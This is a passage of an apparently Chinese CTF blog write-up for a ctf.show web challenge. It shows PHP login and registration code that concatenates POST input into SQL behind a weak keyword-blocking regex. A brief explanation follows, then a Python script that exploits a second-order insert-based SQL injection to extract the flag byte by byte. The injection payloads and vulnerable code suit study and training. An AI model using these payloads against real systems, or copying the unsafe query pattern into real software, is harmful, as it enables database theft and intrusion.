</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;db.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;e&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;p&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$e</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;e&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$p</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;p&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span><span class=s2>&#34;select username from test1 where email=&#39;</span><span class=si>$e</span><span class=s2>&#39; and password=&#39;</span><span class=si>$p</span><span class=s2>&#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>check</span><span class=p>(</span><span class=nv>$e</span><span class=p>)</span><span class=o>&amp;&amp;</span><span class=nx>check</span><span class=p>(</span><span class=nv>$p</span><span class=p>)){</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span><span class=o>=</span><span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$con</span><span class=p>,</span><span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span><span class=nv>$result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$row</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>		<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;u&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nx>header</span><span class=p>(</span><span class=s1>&#39;location:user.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;Wrong username or password&#39;)&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>check</span><span class=p>(</span><span class=nv>$arr</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/load|and|\||\&amp;| |</span><span class=se>\\</span><span class=s2>\|sleep|ascii|if/i&#34;</span><span class=p>,</span><span class=nv>$arr</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;bad hacker!&#39;)&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>           <span class=k>die</span><span class=p>();</span>   
</span></span><span class=line><span class=cl>       <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;db.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;e&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;u&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;p&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$e</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;e&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$u</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;u&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$p</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;p&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;insert into test1
</span></span></span><span class=line><span class=cl><span class=s2>set email = &#39;</span><span class=si>$e</span><span class=s2>&#39;, 
</span></span></span><span class=line><span class=cl><span class=s2>username = &#39;</span><span class=si>$u</span><span class=s2>&#39;,
</span></span></span><span class=line><span class=cl><span class=s2>password = &#39;</span><span class=si>$p</span><span class=s2>&#39;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>check</span><span class=p>(</span><span class=nv>$e</span><span class=p>)</span><span class=o>&amp;&amp;</span><span class=nx>check</span><span class=p>(</span><span class=nv>$u</span><span class=p>)</span><span class=o>&amp;&amp;</span><span class=nx>check</span><span class=p>(</span><span class=nv>$p</span><span class=p>)){</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$con</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;location:login.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>html</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>body</span> <span class=nx>background</span><span class=o>=</span><span class=s2>&#34;bg2.jpg&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=nx>body</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=nx>html</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;db.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;u&#39;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl><span class=nv>$username</span><span class=o>=</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;u&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$username</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>	
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>10</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nv>$username</span><span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;Hello </span><span class=si>$username</span><span class=s2>,there&#39;s nothing here but dog food!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;The username can only be a number.How did you get here?go out!!!&#39;);location.href=&#39;login.php&#39;;&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;Login first!&#39;);location.href=&#39;login.php&#39;;&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>没有预编译，并且可以看到<code>register.php</code>的waf明显不够强，所以可以去打二次注入，username要满足是数字，可以用hex函数转一下，insert注入，直接打即可，不过有个细节就是不能覆盖数据，所以我们写脚本，把数字写大点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://76c86834-e9fb-493c-93ad-bb295d703ee0.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># payload = &#34;hex(hex(substr((select/**/flag/**/from/**/flag)from/**/&#34; + str(i) + &#34;/**/for/**/1))),/*&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;hex(hex(substr((select/**/flag/**/from/**/flag),</span><span class=si>{0}</span><span class=s2>,1))),&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;e&#39;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>30</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;&#39;,username=&#34;</span> <span class=o>+</span> <span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;u&#39;</span><span class=p>:</span> <span class=s2>&#34;#&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;p&#39;</span><span class=p>:</span> <span class=n>i</span><span class=o>+</span><span class=mi>30</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(data1[&#39;e&#39;])</span>
</span></span><span class=line><span class=cl>    <span class=n>r1</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;register.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data2</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;e&#39;</span><span class=p>:</span> <span class=n>i</span><span class=o>+</span><span class=mi>30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;p&#39;</span><span class=p>:</span> <span class=n>i</span><span class=o>+</span><span class=mi>30</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;login.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>r2</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=n>real</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s2>&#34;Hello (.*?),&#34;</span><span class=p>,</span> <span class=n>t</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=n>real</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
<a href=/tags/ssti/>Ssti</a>
<a href=/tags/mysql/>Mysql</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>